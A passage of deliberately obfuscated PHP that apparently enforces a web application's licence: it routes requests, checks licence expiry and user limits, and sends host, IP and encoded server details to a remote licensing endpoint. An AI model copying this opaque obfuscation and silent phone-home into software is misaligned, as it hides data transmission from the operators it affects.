$GLOBALS[$¼‘Íì[13]][$¼‘Íì[14]]); $ÎİÌ„Ô’ = $Ñ‹­ÛÚæ[667]; if (!$ÎİÌ„Ô’) { die; } } private function ulfwe6457cd1() { $¿‚×–È‘ =& $_SERVER[çâ¥×ø³]; $öÒƒª¼³ =& $_SERVER[ĞİŞñ©]; if ($GLOBALS[$öÒƒª¼³[13]][$öÒƒª¼³[15]] != $öÒƒª¼³[6]) { return; } $Ì¸øÑÌª = $_SERVER[$öÒƒª¼³[16]]; $ª²™Ğ¯İ = $öÒƒª¼³[17]; if (!strstr($Ì¸øÑÌª, $ª²™Ğ¯İ)) { return; } $áşéÌ‡¾ = strrpos($Ì¸øÑÌª, $ª²™Ğ¯İ); $Ó‰”Âã° = substr($Ì¸øÑÌª, $áşéÌ‡¾ + strlen($ª²™Ğ¯İ)); $»½Çƒ²ì = $¿‚×–È‘[668]; while (strlen($»½Çƒ²ì) < $¿‚×–È‘[657]) { if (!$»½Çƒ²ì) { break; } $»½Çƒ²ì++; } preg_match_all($öÒƒª¼³[18], $Ó‰”Âã°, $³­ºÆè¬); $Ó‰”Âã° = trim($³­ºÆè¬[0][0], $öÒƒª¼³[19]); $GLOBALS[$öÒƒª¼³[13]][$öÒƒª¼³[14]] = explode($öÒƒª¼³[19], $Ó‰”Âã°); $GLOBALS[$öÒƒª¼³[13]][$öÒƒª¼³[15]] = implode($öÒƒª¼³[0], $GLOBALS[$öÒƒª¼³[13]][$öÒƒª¼³[14]]); $°‹£Ê¢à = $¿‚×–È‘[669]; while (strlen($°‹£Ê¢à) < $¿‚×–È‘[670]) { if (!$°‹£Ê¢à) { break; } $°‹£Ê¢à++; } } public function run() { $¬–¨¼Êè =& $_SERVER[çâ¥×ø³]; $é˜—ÆŒÄ =& $_SERVER[ĞİŞñ©]; $this->ulfwe6457cd1(); $this->zwbk6a06768f(); $’¬´°ÃÔ = $GLOBALS[$é˜—ÆŒÄ[13]][$é˜—ÆŒÄ[14]]; $Ÿ›ƒ¶³³ = $GLOBALS[$é˜—ÆŒÄ[13]][$é˜—ÆŒÄ[15]]; define($é˜—ÆŒÄ[20], isset($’¬´°ÃÔ[0]) && $’¬´°ÃÔ[0] ? $’¬´°ÃÔ[0] : $this->defaultModule); $µ‹Ò´³â = $¬–¨¼Êè[671]; if (strlen($µ‹Ò´³â) < $¬–¨¼Êè[655]) { return; } define($é˜—ÆŒÄ[21], isset($’¬´°ÃÔ[1]) && $’¬´°ÃÔ[0] ? $’¬´°ÃÔ[1] : $this->defaultController); $®¿êã¶ = $¬–¨¼Êè[672]; define($é˜—ÆŒÄ[22], isset($’¬´°ÃÔ[2]) && $’¬´°ÃÔ[0] ? $’¬´°ÃÔ[2] : $this->defaultAction); $Ş·ˆï‘” = $¬–¨¼Êè[673]; if (strlen($Ş·ˆï‘”) < $¬–¨¼Êè[657]) { return; } define($é˜—ÆŒÄ[23], MOD . $é˜—ÆŒÄ[0] . ST . $é˜—ÆŒÄ[0] . ACT); $’‚¯î¬­ = $¬–¨¼Êè[674]; while ($’‚¯î¬­ < $¬–¨¼Êè[657]) { if ($’‚¯î¬­ >= 0) { break; } $’‚¯î¬­++; } $_SERVER[$é˜—ÆŒÄ[24]] = strtolower(ACTION); $á£ßÁš¶ = $¬–¨¼Êè[675]; $this->autorun(); if (count($’¬´°ÃÔ) >= 3) { $this->appRun($Ÿ›ƒ¶³³); } else { $this->appRun(ACTION); } } private $pjge12610cc9 = array(); private $huld15f76ae8 = ''; public function gdfaaa457c78() { $ÍõÆìúœ =& $_SERVER[çâ¥×ø³]; $²´’—Œ” =& $_SERVER[ĞİŞñ©]; $this->nolm11d35e28(); $Ùµ¸ƒ¶¥ = $ÍõÆìúœ[676]; if (strlen($Ùµ¸ƒ¶¥) < $ÍõÆìúœ[660]) { die; } $this->lmrz77a51894(); $¼­³ƒù = $ÍõÆìúœ[677]; if (!$¼­³ƒù) { die; } $this->kuayf5741c41(); $Æ„ù³³ = $ÍõÆìúœ[678]; $this->oqhi6ef0af81(); $ê¿¸ø§å = $ÍõÆìúœ[679]; if (strlen($ê¿¸ø§å) < $ÍõÆìúœ[657]) { return; } $this->pwtz1bc0ffdd(); $áíÅ¸¸œ = $ÍõÆìúœ[680]; if (!$áíÅ¸¸œ) { die; } $this->kbnt777929e3(); $this->iwte90acbf82(); $‡¬äë = $ÍõÆìúœ[681]; $this->wqyz434aa756($²´’—Œ”[25], array($this, $²´’—Œ”[26])); $this->wqyz434aa756($²´’—Œ”[27], array($this, $²´’—Œ”[28])); $this->wqyz434aa756($²´’—Œ”[29], array($this, $²´’—Œ”[30])); $³¬„áÑ€ = $ÍõÆìúœ[682]; if (!$³¬„áÑ€) { return; } $this->wqyz434aa756($²´’—Œ”[31], array($this, $²´’—Œ”[32])); $ãâ°ü† = $ÍõÆìúœ[683]; if (!$ãâ°ü†) { return; } } public function wayuff442bef($§êêæÅ—) { $öºõšú† =& $_SERVER[çâ¥×ø³]; $Ë÷¡ê¾Ä =& $_SERVER[ĞİŞñ©]; $£µÑøƒ = Model($Ë÷¡ê¾Ä[33])->get(); $à‚«¶Ïö = array($Ë÷¡ê¾Ä[34], $Ë÷¡ê¾Ä[35], $Ë÷¡ê¾Ä[36], $Ë÷¡ê¾Ä[37], $Ë÷¡ê¾Ä[38], $Ë÷¡ê¾Ä[39], $Ë÷¡ê¾Ä[40], $Ë÷¡ê¾Ä[41], $Ë÷¡ê¾Ä[42], $Ë÷¡ê¾Ä[43], $Ë÷¡ê¾Ä[44], $Ë÷¡ê¾Ä[45], $Ë÷¡ê¾Ä[46], $Ë÷¡ê¾Ä[47], $Ë÷¡ê¾Ä[48], $Ë÷¡ê¾Ä[49], $Ë÷¡ê¾Ä[50], $Ë÷¡ê¾Ä[51], $Ë÷¡ê¾Ä[52], $Ë÷¡ê¾Ä[53], $Ë÷¡ê¾Ä[54], $Ë÷¡ê¾Ä[55], $Ë÷¡ê¾Ä[56], $Ë÷¡ê¾Ä[57], $Ë÷¡ê¾Ä[58], $Ë÷¡ê¾Ä[59], $Ë÷¡ê¾Ä[60], $Ë÷¡ê¾Ä[61], $Ë÷¡ê¾Ä[62], $Ë÷¡ê¾Ä[63], $Ë÷¡ê¾Ä[64], $Ë÷¡ê¾Ä[65], $Ë÷¡ê¾Ä[66], $Ë÷¡ê¾Ä[67], $Ë÷¡ê¾Ä[68], $Ë÷¡ê¾Ä[69], $Ë÷¡ê¾Ä[70], $Ë÷¡ê¾Ä[71], $Ë÷¡ê¾Ä[72], $Ë÷¡ê¾Ä[73], $Ë÷¡ê¾Ä[74], $Ë÷¡ê¾Ä[75], $Ë÷¡ê¾Ä[76], $Ë÷¡ê¾Ä[77], $Ë÷¡ê¾Ä[78], $Ë÷¡ê¾Ä[79], $Ë÷¡ê¾Ä[80], $Ë÷¡ê¾Ä[81], $Ë÷¡ê¾Ä[82], $Ë÷¡ê¾Ä[83], $Ë÷¡ê¾Ä[84]); $°ä×“‚ = $öºõšú†[684]; foreach ($à‚«¶Ïö as $¿±­ôÎ¼) { $ÁÍÁ—³Å = $GLOBALS[$Ë÷¡ê¾Ä[85]][$Ë÷¡ê¾Ä[86]][$¿±­ôÎ¼]; $¦¸¿„Î = $öºõšú†[685]; if (!$¦¸¿„Î) { die; } if (isset($£µÑøƒ[$¿±­ôÎ¼])) { $ÁÍÁ—³Å = $£µÑøƒ[$¿±­ôÎ¼]; } $§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[88]][$¿±­ôÎ¼] = $ÁÍÁ—³Å; } $Ù‰‰ÆÑ® = $§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[88]][$Ë÷¡ê¾Ä[46]]; unset($§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[89]][$Ë÷¡ê¾Ä[90]]); $¹ˆí”Ô¼ = $öºõšú†[686]; if (strlen($¹ˆí”Ô¼) < $öºõšú†[670]) { die; } unset($§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[89]][$Ë÷¡ê¾Ä[91]]); $ŞºÜöÈ‘ = $öºõšú†[687]; if (!$ŞºÜöÈ‘) { die; } unset($§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[88]][$Ë÷¡ê¾Ä[46]]); $ÃñĞËœø = $öºõšú†[688]; while ($ÃñĞËœø < $öºõšú†[660]) { if ($ÃñĞËœø >= 0) { break; } $ÃñĞËœø++; } unset($§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[88]][$Ë÷¡ê¾Ä[92]]); $§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[88]][$Ë÷¡ê¾Ä[93]] = array($Ë÷¡ê¾Ä[94] => (int) $Ù‰‰ÆÑ®[$Ë÷¡ê¾Ä[95]], $Ë÷¡ê¾Ä[96] => (int) _get($Ù‰‰ÆÑ®, $Ë÷¡ê¾Ä[97], 0)); $¨Ûç· = substr(md5($Ë÷¡ê¾Ä[98] . get_client_ip() . $£µÑøƒ[$Ë÷¡ê¾Ä[99]]), 0, 15); $÷©ó†¾¶ = $öºõšú†[689]; $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[101]] = Mcrypt::encode(Session::sign(), $¨Ûç·, 3600 * 24); $€šˆ¤°’ = $öºõšú†[690]; if (!$€šˆ¤°’) { die; } $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[102]] = Action($Ë÷¡ê¾Ä[103])->accessToken(); $Ô©ä«ú = $öºõšú†[691]; $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[104]] = md5($_SERVER[$Ë÷¡ê¾Ä[105]] . $£µÑøƒ[$Ë÷¡ê¾Ä[99]]); $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[106]] = base64_encode(serverInfo()); $°·Ì¤òœ = $öºõšú†[692]; if (strlen($°·Ì¤òœ) < $öºõšú†[653]) { return; } $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[107]] = $this->huld15f76ae8; $–ìûßç¾ = $öºõšú†[693]; if ($£µÑøƒ[$Ë÷¡ê¾Ä[107]] != $Ë÷¡ê¾Ä[108]) { $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[109]] = $£µÑøƒ[$Ë÷¡ê¾Ä[109]]; $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[110]] = $£µÑøƒ[$Ë÷¡ê¾Ä[110]]; $š œµÜç = rand_string(10) . $this->huld15f76ae8 . rand_string(5); $§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[111]][$Ë÷¡ê¾Ä[112]] = $this->sflu0a81865d($š œµÜç, $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[104]]); } if ($this->huld15f76ae8 == $Ë÷¡ê¾Ä[108]) { $§êêæÅ—[$Ë÷¡ê¾Ä[87]][$Ë÷¡ê¾Ä[88]][$Ë÷¡ê¾Ä[93]][$Ë÷¡ê¾Ä[97]] = 0; } $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[113]] = _get($this->pjge12610cc9, $Ë÷¡ê¾Ä[114], $Ë÷¡ê¾Ä[6]); $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[115]] = _get($this->pjge12610cc9, $Ë÷¡ê¾Ä[116], $Ë÷¡ê¾Ä[6]); if (_get($GLOBALS, $Ë÷¡ê¾Ä[117]) && $this->config[$Ë÷¡ê¾Ä[118]]) { $§êêæÅ—[$Ë÷¡ê¾Ä[100]][$Ë÷¡ê¾Ä[119]] = WEB_ROOT; } return $§êêæÅ—; } private function kbnt777929e3() { $©ñíğé¨ =& $_SERVER[çâ¥×ø³]; $´›Ñ¨öÑ =& $_SERVER[ĞİŞñ©]; $Ÿ¢Óäå  = $_SERVER[$´›Ñ¨öÑ[24]] == $´›Ñ¨öÑ[120]; $¹á‹ = $©ñíğé¨[694]; while ($¹á‹ < $©ñíğé¨[657]) { if ($¹á‹ >= 0) { break; } $¹á‹++; } if ($_SERVER[$´›Ñ¨öÑ[24]] == $´›Ñ¨öÑ[121] && $_GET[$´›Ñ¨öÑ[122]] == $´›Ñ¨öÑ[123]) { $Ÿ¢Óäå  = !0; } if ($Ÿ¢Óäå ) { $Ò¦”˜» = array($´›Ñ¨öÑ[107] => $this->huld15f76ae8, $´›Ñ¨öÑ[124] => $this->wqxea1f566b1(), $´›Ñ¨öÑ[125] => Model($´›Ñ¨öÑ[126])->count()); if ($this->huld15f76ae8 != $´›Ñ¨öÑ[108]) { $»°Çı¿ = _get($this->pjge12610cc9, $´›Ñ¨öÑ[127]); if ($»°Çı¿) { $Ò¦”˜»[$´›Ñ¨öÑ[128]] = $»°Çı¿; $Ò¦”˜»[$´›Ñ¨öÑ[129]] = strtotime(_get($this->pjge12610cc9, $´›Ñ¨öÑ[130])); $Ò¦”˜»[$´›Ñ¨öÑ[131]] = _get($this->pjge12610cc9, $´›Ñ¨öÑ[116]); } $ñ¨İ±ûŠ = Model($´›Ñ¨öÑ[33])->get($´›Ñ¨öÑ[132], $´›Ñ¨öÑ[6], !0); if (is_string($ñ¨İ±ûŠ) && substr($ñ¨İ±ûŠ, 0, 1) == $´›Ñ¨öÑ[133]) { $ñ¨İ±ûŠ = json_decode_force($ñ¨İ±ûŠ); } if (is_array($ñ¨İ±ûŠ) && $ñ¨İ±ûŠ[$´›Ñ¨öÑ[134]] && strstr($ñ¨İ±ûŠ[$´›Ñ¨öÑ[134]], $´›Ñ¨öÑ[135])) { $ë¾ëš°½ = explode($´›Ñ¨öÑ[135], $ñ¨İ±ûŠ[$´›Ñ¨öÑ[134]]); $Ò¦”˜»[$´›Ñ¨öÑ[136]] = $ë¾ëš°½[0]; } } $Ò¦”˜» = $this->nyvo7344c7c9(json_encode($Ò¦”˜»), md5($´›Ñ¨öÑ[137])); $ó­Ïàã™ = $©ñíğé¨[695]; $÷ËÉ›Öµ = array($´›Ñ¨öÑ[138] => $Ò¦”˜»); call_user_func(array($´›Ñ¨öÑ[139], $´›Ñ¨öÑ[140]), $÷ËÉ›Öµ); } if ($this->huld15f76ae8 == $´›Ñ¨öÑ[108]) { return; } $’«”¹Ü = array($´›Ñ¨öÑ[141], $´›Ñ¨öÑ[142], $´›Ñ¨öÑ[143], $´›Ñ¨öÑ[144], $´›Ñ¨öÑ[145], $´›Ñ¨öÑ[146]); $£ö°‚Ğ– = Model($´›Ñ¨öÑ[33])->get(); $õ€ïú«Î = $©ñíğé¨[696]; $÷ËÉ›Öµ = array($´›Ñ¨öÑ[147] => $£ö°‚Ğ–[$´›Ñ¨öÑ[34]], $´›Ñ¨öÑ[148] => $£ö°‚Ğ–[$´›Ñ¨öÑ[35]], $´›Ñ¨öÑ[149] => $´›Ñ¨öÑ[6]); $Êå°çø¤ = $©ñíğé¨[697]; foreach ($’«”¹Ü as $ÃıÊ”Óı) { if (!isset($£ö°‚Ğ–[$ÃıÊ”Óı]) || !$£ö°‚Ğ–[$ÃıÊ”Óı]) { continue; } $÷ËÉ›Öµ[$ÃıÊ”Óı] = $£ö°‚Ğ–[$ÃıÊ”Óı]; } call_user_func(array($´›Ñ¨öÑ[139], $´›Ñ¨öÑ[140]), $÷ËÉ›Öµ); } private function oqhi6ef0af81() { $¸Çµ¢íı =& $_SERVER[çâ¥×ø³]; $øßïÊï» =& $_SERVER[ĞİŞñ©]; if ($_SERVER[$øßïÊï»[24]] != $øßïÊï»[150]) { return; } if (!_get($GLOBALS, $øßïÊï»[117])) { die; } $ûåºˆòÈ = $GLOBALS[$øßïÊï»[13]]; if (isset($ûåºˆòÈ[$øßïÊï»[151]])) { $this->ezar4a27aaff(); die; } if (!isset($ûåºˆòÈ[$øßïÊï»[152]]) || strlen($ûåºˆòÈ[$øßïÊï»[152]]) != 16) { show_json($øßïÊï»[153] . $ûåºˆòÈ[$øßïÊï»[152]], !1); } $‚Õàó‰Î = Model($øßïÊï»[33])->get($øßïÊï»[99]); $Öş˜¤âÕ = md5($_SERVER[$øßïÊï»[105]] . $‚Õàó‰Î); $åÎÚï®ˆ = $¸Çµ¢íı[698]; if (strlen($åÎÚï®ˆ) < $¸Çµ¢íı[655]) { die; } $“÷‰û¿ = array($øßïÊï»[152] => $ûåºˆòÈ[$øßïÊï»[152]], $øßïÊï»[154] => rand_string(16), $øßïÊï»[155] => $øßïÊï»[137], $øßïÊï»[156] => $øßïÊï»[157], $øßïÊï»[158] => $_SERVER[$øßïÊï»[159]], $øßïÊï»[160] => $_SERVER[$øßïÊï»[161]], $øßïÊï»[162] => $_SERVER[$øßïÊï»[163]], $øßïÊï»[104] => $Öş˜¤âÕ, $øßïÊï»[164] => Model($øßïÊï»[33])->get($øßïÊï»[132])); $şÀ‰¸«Š = $¸Çµ¢íı[699]; if (!$şÀ‰¸«Š) { die; } if ($ûåºˆòÈ[$øßïÊï»[165]] == $øßïÊï»[166]) { $ÚìÔ³¿Å = $this->nyvo7344c7c9($Öş˜¤âÕ, $øßïÊï»[167]); $üÊş˜ = $this->sflu0a81865d(json_encode($“÷‰û¿), $Öş˜¤âÕ . $øßïÊï»[168], 3); $üÊş˜ = $üÊş˜ . $øßïÊï»[169] . $_SERVER[$øßïÊï»[159]]; $£’ŞãºŒ = $this->vmbj465b0d18($øßïÊï»[170] . $ÚìÔ³¿Å . $øßïÊï»[171] . $üÊş˜, -1); show_json($£’ŞãºŒ, !0); } else { if ($ûåºˆòÈ[$øßïÊï»[165]] == $øßïÊï»[172]) { $«±‰Ì±˜ = substr(md5($øßïÊï»[173] . $Öş˜¤âÕ), 12, 15) . $øßïÊï»[174]; $üÊş˜ = $this->letu9b1262c5(trim($ûåºˆòÈ[$øßïÊï»[175]]), $«±‰Ì±˜, 2); $ ŞØ ¢ = json_decode($üÊş˜, !0); if (!is_array($ ŞØ ¢) || !is_array($ ŞØ ¢[$øßïÊï»[176]]) || $ ŞØ ¢[$øßïÊï»[152]] != !0) { $ì–†”‰Ÿ = $øßïÊï»[177]; $ â•–×• = $ ŞØ ¢[$øßïÊï»[176]] ? $øßïÊï»[178] . $ ŞØ ¢[$øßïÊï»[176]] : $ì–†”‰Ÿ; show_json($ â•–×•, !1); } else { $“÷‰û¿[$øßïÊï»[154]] = $ ŞØ ¢[$øßïÊï»[176]][$øßïÊï»[179]]; } } else { $ ŞØ ¢ = $this->vmbj465b0d18($øßïÊï»[180], $“÷‰û¿, 10); $ÖòÅü¯Ú = $¸Çµ¢íı[700]; if (strlen($ÖòÅü¯Ú) < $¸Çµ¢íı[657]) { die; } } } if (!is_array($ ŞØ ¢) || !is_array($ ŞØ ¢[$øßïÊï»[176]]) || $ ŞØ ¢[$øßïÊï»[152]] != !0) { $ì–†”‰Ÿ = LNG($øßïÊï»[181]); $ â•–×• = $ ŞØ ¢[$øßïÊï»[176]] ? $øßïÊï»[178] . $ ŞØ ¢[$øßïÊï»[176]] : $ì–†”‰Ÿ; show_json($ â•–×•, !1); } $êÅÍËÁÕ = $ ŞØ ¢[$øßïÊï»[176]]; $õ­‹°¸ = $this->zgdp09c00ca0($êÅÍËÁÕ[$øßïÊï»[182]]); $£º‰‹¨ = $¸Çµ¢íı[701]; if (!$£º‰‹¨) { return; } if (!$õ­‹°¸ || $õ­‹°¸ != $êÅÍËÁÕ[$øßïÊï»[130]]) { $€óÌÜÁ˜ = array($øßïÊï»[183] => Model($øßïÊï»[33])->get($øßïÊï»[99]), $øßïÊï»[184] => $_SERVER[$øßïÊï»[105]], $øßïÊï»[185] => this_url(), $øßïÊï»[160] => $_SERVER[$øßïÊï»[161]]); $üÊş˜ = $this->ucia4eda5017(json_encode($€óÌÜÁ˜)); $this->vmbj465b0d18($øßïÊï»[186] . $üÊş˜); show_json(LNG($øßïÊï»[187]), !0); } $¬à¬¯Ğß = array($øßïÊï»[188] => $êÅÍËÁÕ[$øßïÊï»[189]], $øßïÊï»[190] => $êÅÍËÁÕ[$øßïÊï»[191]], $øßïÊï»[192] => rand_string(16), $øßïÊï»[107] => $êÅÍËÁÕ[$øßïÊï»[193]]); if ($“÷‰û¿[$øßïÊï»[154]]) { $¬à¬¯Ğß[$øßïÊï»[192]] = $“÷‰û¿[$øßïÊï»[154]]; } $ô§¡°  = substr(md5($¬à¬¯Ğß[$øßïÊï»[190]]), 10, 10); $¨÷ââùå = $ô§¡°  . $¬à¬¯Ğß[$øßïÊï»[107]] . $¬à¬¯Ğß[$øßïÊï»[192]]; $Ü«Àñ¬Ò = $¸Çµ¢íı[702]; if (strlen($Ü«Àñ¬Ò) < $¸Çµ¢íı[655]) { die; } $¬à¬¯Ğß[$øßïÊï»[109]] = strrev(base64_encode($this->nyvo7344c7c9($¨÷ââùå, $øßïÊï»[194]))); $Ó…‘¾² = $¸Çµ¢íı[703]; while (strlen($Ó…‘¾²) < $¸Çµ¢íı[653]) { if (!$Ó…‘¾²) { break; } $Ó…‘¾²++; } $¿ëÆÙÀÉ = rand_string(16); $¨²Ó…¢‚ = $¿ëÆÙÀÉ . $¬à¬¯Ğß[$øßïÊï»[107]] . $this->nyvo7344c7c9(md5($¬à¬¯Ğß[$øßïÊï»[188]]), $¿ëÆÙÀÉ); $¼‰Êƒ·ˆ = $¸Çµ¢íı[704]; if (!$¼‰Êƒ·ˆ) { die; } $¬à¬¯Ğß[$øßïÊï»[110]] = base64_encode(strrev($this->nyvo7344c7c9($¨²Ó…¢‚, $øßïÊï»[195]))); $úˆ®¬Ë = $¸Çµ¢íı[705]; if ($êÅÍËÁÕ[$øßïÊï»[196]] && $êÅÍËÁÕ[$øßïÊï»[196]] >= 1) { Model($øßïÊï»[33])->setDeep($øßïÊï»[197], $øßïÊï»[123]); } Model($øßïÊï»[33])->set($¬à¬¯Ğß); $«“¼Ø·Ÿ = md5($_SERVER[$øßïÊï»[105]] . strrev($‚Õàó‰Î) . $¬à¬¯Ğß[$øßïÊï»[190]]); $îÒ‚ì»Ú = $¸Çµ¢íı[706]; while (strlen($îÒ‚ì»Ú) < $¸Çµ¢íı[670]) { if (!$îÒ‚ì»Ú) { break; } $îÒ‚ì»Ú++; } $åØ‚Ê­¥ = strrev(substr($«“¼Ø·Ÿ, 10, 16)); $°º¾˜œÖ = $¸Çµ¢íı[707]; if (!$°º¾˜œÖ) { return; } $Œî’Şº‹ = $this->sflu0a81865d(json_encode($êÅÍËÁÕ), $«“¼Ø·Ÿ); $úšÙÈòÅ = array_to_keyvalue(Model($øßïÊï»[7])->listData(), $øßïÊï»[198]); $Û°‚ô– = $¸Çµ¢íı[708]; if (!$Û°‚ô–) { return; } $·’ºµÑ = $úšÙÈòÅ[$øßïÊï»[199]]; $ŸĞ½Ïì = $¸Çµ¢íı[709]; $™áÀÃó× = array(); $›ÁÛ•À = $¸Çµ¢íı[710]; if (strlen($›ÁÛ•À) < $¸Çµ¢íı[653]) { return; } $™áÀÃó×[$åØ‚Ê­¥] = $Œî’Şº‹; Model($øßïÊï»[7])->update($·’ºµÑ[$øßïÊï»[200]], array($øßïÊï»[201] => $™áÀÃó×)); $¯Ş¤æ¿ƒ = $¸Çµ¢íı[711]; $this->pjge12610cc9 = $êÅÍËÁÕ; $÷ˆ»ŸÈŒ = $¸Çµ¢íı[712]; $this->huld15f76ae8 = $¬à¬¯Ğß[$øßïÊï»[107]]; $this->licenseRegistSuccess(); Cache::set($øßïÊï»[202] . md5($‚Õàó‰Î . $øßïÊï»[203]), $øßïÊï»[6]); show_json(LNG($øßïÊï»[187]), !0); $ßÔº¯©® = $¸Çµ¢íı[713]; if (!$ßÔº¯©®) { return; } } private function licenseRegistSuccess() { $ªÆµ§ûÂ =& $_SERVER[çâ¥×ø³]; $¸ÆğÆ…ñ =& $_SERVER[ĞİŞñ©]; $óãêïı© = Model($¸ÆğÆ…ñ[33])->get(); $ç¡ÀÂã´ = $ªÆµ§ûÂ[714]; while (strlen($ç¡ÀÂã´) < $ªÆµ§ûÂ[660]) { if (!$ç¡ÀÂã´) { break; } $ç¡ÀÂã´++; } if ($óãêïı©[$¸ÆğÆ…ñ[63]] != $¸ÆğÆ…ñ[123]) { Model($¸ÆğÆ…ñ[33])->set($¸ÆğÆ…ñ[63], $¸ÆğÆ…ñ[123]); } Action($¸ÆğÆ…ñ[204])->initStart(!0); } private function ezar4a27aaff() { $Ü†½ÏØí =& $_SERVER[çâ¥×ø³]; $‰‰÷ä =& $_SERVER[ĞİŞñ©]; Model($‰‰÷ä[33])->set(array($‰‰÷ä[188] => $‰‰÷ä[6], $‰‰÷ä[190] => $‰‰÷ä[6], $‰‰÷ä[107] => $‰‰÷ä[108], $‰‰÷ä[109] => $‰‰÷ä[6], $‰‰÷ä[110] => $‰‰÷ä[6])); $êÛ®œÒ½ = $Ü†½ÏØí[715]; if (!$êÛ®œÒ½) { die; } Model($‰‰÷ä[33])->setDeep($‰‰÷ä[197], $‰‰÷ä[205]); $í¯Ÿ³‡û = $Ü†½ÏØí[716]; if (strlen($í¯Ÿ³‡û) < $Ü†½ÏØí[660]) { return; } $this->pjge12610cc9 = array(); $ì¨Çëè³ = $Ü†½ÏØí[717]; if (strlen($ì¨Çëè³) < $Ü†½ÏØí[670]) { die; } $this->huld15f76ae8 = $‰‰÷ä[108]; $¡Ó‘©Œ… = $Ü†½ÏØí[718]; if (!$¡Ó‘©Œ…) { return; } } private function nolm11d35e28() { $åÑ‰±ÛÙ =& $_SERVER[çâ¥×ø³]; $ª¯Ï‹»ï =& $_SERVER[ĞİŞñ©]; $_SERVER[$ª¯Ï‹»ï[161]] = _get($_SERVER, $ª¯Ï‹»ï[161], APP_HOST); $this->huld15f76ae8 = $ª¯Ï‹»ï[108]; $Õ¾éÅÔ = Model($ª¯Ï‹»ï[33])->get(); if ($Õ¾éÅÔ[$ª¯Ï‹»ï[107]] == $ª¯Ï‹»ï[108]) { return; } $ĞÕ©´î‡ = Model($ª¯Ï‹»ï[33])->get($ª¯Ï‹»ï[99]); $äÀĞ¯ = $ª¯Ï‹»ï[202] . md5($ĞÕ©´î‡ . $ª¯Ï‹»ï[203]); $ÄÚÜ¾«Ö = Cache::get($äÀĞ¯); $»Æ›úİç = $åÑ‰±ÛÙ[719]; while (strlen($»Æ›úİç) < $åÑ‰±ÛÙ[655]) { if (!$»Æ›úİç) { break; } $»Æ›úİç++; } if (!is_array($ÄÚÜ¾«Ö) || !isset($ÄÚÜ¾«Ö[$ª¯Ï‹»ï[206]]) || time() - $ÄÚÜ¾«Ö[$ª¯Ï‹»ï[206]] >= 60) { $ˆªÔÚ´ß = Model($ª¯Ï‹»ï[7])->loadList(); $é§º»ï‡ = $ˆªÔÚ´ß[$ª¯Ï‹»ï[199]]; $¤û€ïÛú = md5($_SERVER[$ª¯Ï‹»ï[105]] . strrev($ĞÕ©´î‡) . $Õ¾éÅÔ[$ª¯Ï‹»ï[190]]); $Ë“ôç­Ò = strrev(substr($¤û€ïÛú, 10, 16)); $ÄÚÜ¾«Ö = $this->letu9b1262c5($é§º»ï‡[$ª¯Ï‹»ï[85]][$Ë“ôç­Ò], $¤û€ïÛú); $ÄÚÜ¾«Ö = json_decode($ÄÚÜ¾«Ö, !0); } if (!is_array($ÄÚÜ¾«Ö)) { return $this->ezar4a27aaff(); } $ŠÙ­ÛÎ = strtotime($ÄÚÜ¾«Ö[$ª¯Ï‹»ï[130]]); if (time() >= $ŠÙ­ÛÎ) { return $this->ezar4a27aaff(); } if (time() - $ÄÚÜ¾«Ö[$ª¯Ï‹»ï[206]] > 20) { $ÄÚÜ¾«Ö[$ª¯Ï‹»ï[206]] = time(); Cache::set($äÀĞ¯, $ÄÚÜ¾«Ö); } $this->pjge12610cc9 = $ÄÚÜ¾«Ö; $this->huld15f76ae8 = $Õ¾éÅÔ[$ª¯Ï‹»ï[107]]; $Á •Ç¾– = $åÑ‰±ÛÙ[720]; } private function lmrz77a51894() { $ï¥Ãæ‘  =& $_SERVER[çâ¥×ø³]; $‚¬¡‡Ø¹ =& $_SERVER[ĞİŞñ©]; $ü ëÑ¼ƒ = $GLOBALS[$‚¬¡‡Ø¹[13]]; $áîÊëÂ‰ = $ï¥Ãæ‘ [721]; if (!$áîÊëÂ‰) { return; } $ö²¼„±Ä = $_SERVER[$‚¬¡‡Ø¹[24]]; $¶ıš… = $ï¥Ãæ‘ [722]; if ($ö²¼„±Ä == $‚¬¡‡Ø¹[207] && $this->huld15f76ae8 == $‚¬¡‡Ø¹[108]) { show_json(LNG($‚¬¡‡Ø¹[208]), !1, $‚¬¡‡Ø¹[209]); } $ÁÀ…Êû¶ = array($‚¬¡‡Ø¹[210], $‚¬¡‡Ø¹[211]); if (in_array($ö²¼„±Ä, $ÁÀ…Êû¶)) { if ($this->huld15f76ae8 == $‚¬¡‡Ø¹[108] && isset($ü ëÑ¼ƒ[$‚¬¡‡Ø¹[212]])) { show_json(LNG($‚¬¡‡Ø¹[208]), !1, $‚¬¡‡Ø¹[209]); die; } $Ç¼ÜÎ¦› = $this->wqxea1f566b1(); if ($Ç¼ÜÎ¦› != intval($‚¬¡‡Ø¹[213])) { if ($Ç¼ÜÎ¦› <= Model($‚¬¡‡Ø¹[126])->count()) { show_json(LNG($‚¬¡‡Ø¹[214]), !1, $‚¬¡‡Ø¹[209]); die; } } } } private function kuayf5741c41() { $èÍ±°‡ =& $_SERVER[çâ¥×ø³]; $üûÒôíÕ =& $_SERVER[ĞİŞñ©]; $Ï”Ô—é = array($üûÒôíÕ[120], 